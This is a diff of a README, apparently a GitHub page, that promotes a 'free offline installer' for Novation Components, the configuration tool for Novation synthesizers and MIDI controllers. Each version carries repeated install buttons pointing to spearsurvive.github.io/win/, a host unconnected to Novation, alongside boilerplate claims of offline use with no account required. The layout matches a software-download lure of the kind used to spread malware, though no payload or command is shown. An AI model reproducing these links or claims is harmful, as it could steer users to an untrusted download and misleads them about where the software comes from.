@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-MIDI+Controller-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Synthesizer+Control-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Novation Components Free Installer** — Novation Components is the web-based editor for Novation MIDI controllers including Launchpad, Launch Control, and Circuit series. Works without internet access, no account required. Full offline installation.
+**💻 Novation Components Free Installer** — Novation Components is the web-based and desktop application for configuring Novation hardware synthesizers and MIDI controllers including the Circuit, Circuit Tracks, Bass Station II, and Launchpad series. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Novation Components](https://img.shields.io/badge/⬇_Install_Novation%20Components-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Novation Components](https://img.shields.io/badge/⬇_Install_Novation+Components-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Novation Components
 
-Novation Components is the web-based editor for Novation MIDI controllers including Launchpad, Launch Control, and Circuit series. It allows custom mapping, firmware updates, and session template management through a browser interface.
+Novation Components is the web-based and desktop application for configuring Novation hardware synthesizers and MIDI controllers including the Circuit, Circuit Tracks, Bass Station II, and Launchpad series. Edit sound parameters, manage presets, update firmware, and configure performance settings for Novation hardware through a clean visual interface that mirrors the hardware's own controls.
 
 ---
 
 ## ❌ Problem: Novation Components is hard to access
 
-- **Hardware Required** — Only useful for Novation hardware owners
-- **Browser-Based** — Runs in a web browser requiring internet and Chrome/Edge
-- **Internet Required** — Cannot configure hardware offline
-- **Limited Offline Use** — Templates cannot be edited without internet connection
+- **Novation Hardware Required** — Only useful with compatible Novation instruments and controllers
+- **Web Dependency** — Original web-based version requires internet; desktop version reduces dependency
+- **Feature Coverage** — Configuration depth varies across different Novation hardware models
+- **Firmware Updates** — Major firmware updates occasionally change functionality
 
 ---
 
@@ -81,7 +81,7 @@ Novation Components is the web-based editor for Novation MIDI controllers includ
 
 <div align="center">
 
-[![⬇ Install Novation Components](https://img.shields.io/badge/⬇_Install_Novation%20Components-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Novation Components](https://img.shields.io/badge/⬇_Install_Novation+Components-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Novation Components is the web-based editor for Novation MIDI controllers includ
 
 ---
 
-**Novation Components Free Installer** — Novation Components is the web-based editor for Novation MIDI controllers including Launchpad, Launch Control, and Circuit series. Install without internet connection today!
+**Novation Components Free Installer** — Novation Components is the web-based and desktop application for configuring Novation hardware synthesizers and MIDI controllers including the Circuit, Circuit Tracks, Bass Station II, and Launchpad series. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Novation Components](https://img.shields.io/badge/⬇_Install_Novation%20Components-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Novation Components](https://img.shields.io/badge/⬇_Install_Novation+Components-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
